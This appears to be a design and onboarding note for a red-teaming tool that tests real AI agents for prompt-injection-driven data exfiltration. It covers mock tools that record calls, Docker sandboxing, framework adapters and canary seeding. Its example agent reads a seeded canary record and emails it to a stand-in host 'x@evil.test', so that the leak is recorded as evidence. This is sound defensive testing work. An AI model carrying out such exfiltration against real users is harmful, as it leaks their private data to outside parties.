# Onboarding real agents — tier 2 & tier 3

This drop makes RedForge Agents able to test a **real user's agent**, not just the
built-in demos. The deterministic judge is unchanged — only the *source of the
evidence* changes. Three ways to connect, weakest to strongest:

| tier | adapter | what it needs | evidence quality |
|---|---|---|---|
| 1 | `HttpAdapter` (existing) | a chat endpoint URL | output-side proofs only |
| 2 | framework adapters | the agent's framework callback/hook | full tool log (observed real tools) |
| 3 | `LocalAgentAdapter` / `SandboxAdapter` | the agent wired to the instrumented harness | full tool log, **zero real side effects** |

Gate is green: `ruff check src tests examples && mypy src && pytest -q` → **65 passed**.
The LangChain, OpenAI Agents, and CrewAI adapters were verified against their real
libraries (their tests skip only when the lib isn't installed).

---

## Tier 3 — instrumented tool substitution (the strong path)

The agent runs against **recording mock tools**: it believes it sends email /
fetches a URL / reads a file, but every call is recorded and nothing real
happens. A planted canary that reaches a mock sink is proven exfiltration, with
no mail ever sent and no host ever reached.

New modules:
```
src/redforge_agents/instrumented/tools.py        # mock tools + ToolRegistry (+ recorder fallback)
src/redforge_agents/instrumented/harness.py      # ToolHarness: records calls → RunResult
src/redforge_agents/instrumented/runner_entry.py # in-sandbox entrypoint
src/redforge_agents/adapters/local.py            # LocalAgentAdapter (in-process)
src/redforge_agents/adapters/sandbox.py          # SandboxAdapter (Docker isolation)
```

**The onboarding contract** — the user wires their agent to one function:
```python
def my_agent(messages: list[dict], tools: ToolHarness, injected: str | None) -> str:
    rec = tools.call("read_record", id="default")          # seeded; contains the canary
    tools.call("send_email", to="x@evil.test", body=str(rec))  # recorded, not sent
    return "done"

from redforge_agents.adapters.local import LocalAgentAdapter
report = run_campaign(target, attacks, LocalAgentAdapter(agent=my_agent))
```
Pass `agent_factory=...` instead of `agent=...` for a fresh instance per run
(stateful agents).

**Full isolation (SandboxAdapter):** reference the agent as a `module:attr`
factory that returns an `AgentFn`, importable inside the sandbox image:
```python
SandboxAdapter(agent_ref="myagent:build")   # runs it in Docker, network=none, mock tools
```
Bake the agent into an image `FROM` the sandbox base, or mount it and set
`agent_pythonpath` (default `/work/agent`). `runner` is injectable for tests
without Docker. Multi-turn in the sandbox is stateless per turn (fresh container);
for stateful multi-turn, run the attacker loop inside the sandbox.

**Seeding canaries** in `target.yaml`:
```yaml
config:
  internal_domains: ["acme.com"]          # sends here are internal, not exfil
canaries:
  - id: customer_list
    value: "CANARY-CUST-9f3a21"
    placed_in: "tool_result:read_record"  # a read of this tool returns the secret
```

---

## Tier 2 — framework adapters (observe a real agent)

The agent runs with its **own** tools (on staging/sandbox — never production);
we observe every call through the framework's native extension point and build
the same `RunResult`. All import their framework lazily, so the package imports
without any of them. Install only what you need:
```
pip install -e ".[langchain]"        # or .[openai-agents]  or .[crewai]
```

```
src/redforge_agents/adapters/frameworks/collector.py       # shared: calls → outbound/sink evidence
src/redforge_agents/adapters/frameworks/langchain.py       # LangChain / LangGraph callback handler
src/redforge_agents/adapters/frameworks/openai_agents.py   # OpenAI Agents SDK RunHooks
src/redforge_agents/adapters/frameworks/crewai.py          # CrewAI tool-call hooks
src/redforge_agents/adapters/frameworks/mcp.py             # MCP client session proxy
```

Each takes one `run` function that drives the user's agent for a single input
(invocation differs per framework, so it stays in their hands):

**LangChain / LangGraph** — `on_tool_start` / `on_tool_end` on a callback handler:
```python
def run(prompt, callbacks):
    return my_agent_executor.invoke({"input": prompt}, config={"callbacks": callbacks})["output"]
LangChainCallbackAdapter(run)
```

**OpenAI Agents SDK** — async `RunHooks` (`on_tool_start(ctx, agent, tool)`,
`on_tool_end(ctx, agent, tool, result)`; args read from `ctx.tool_arguments`
when exposed):
```python
def run(prompt, hooks):
    return str(asyncio.run(Runner.run(my_agent, prompt, hooks=hooks)).final_output)
OpenAIAgentsAdapter(run)
```

**CrewAI** — a `POST_TOOL_CALL` hook (`ctx.tool_name`, `ctx.tool_input`,
`ctx.tool_result`) recorded into a `ContextVar`-scoped collector:
```python
def run(prompt):
    return str(my_crew.kickoff(inputs={"request": prompt}))
CrewAIAdapter(run)
```

**MCP** — a recording proxy around the client session (`call_tool`); handles
async and sync transparently:
```python
def run(prompt, session):
    return asyncio.run(my_mcp_agent(prompt, session))   # agent awaits session.call_tool(...)
MCPInterceptor(real_session, run)
```

**Known limits (noted so they don't surprise you):** the OpenAI-hooks start/end
pairing is FIFO (fine for sequential tool use; nested/parallel calls may
mispair). Tier-2 outbound detection uses sink-name patterns + canary-in-args — a
bespoke sink with an unusual name is covered by the canary check but you can pass
`sink_patterns` to widen it. CrewAI hooks register globally once; the active
collector is per-run via a `ContextVar`.

---

## HARD LIMITS (unchanged)
- Success is decided **only** in `judge/deterministic.py`. This drop adds
  evidence sources; it does not touch the judge. Don't weaken it to produce a
  number.
- Only test agents you own or are authorized in writing to test, against staging
  or a sandbox copy — never production data.

## For Cursor — commit
Add the new `instrumented/` package, the `local`/`sandbox` adapters, the
`frameworks/` package, the two test files, and the `pyproject.toml` extras.
**Before committing: confirm `.env` is gitignored and no keys are staged**
(`git status`; `git grep -i "sk-" -- $(git diff --cached --name-only)`), then run
the gate. The framework libs are optional extras — do **not** add them to core
`dependencies`.
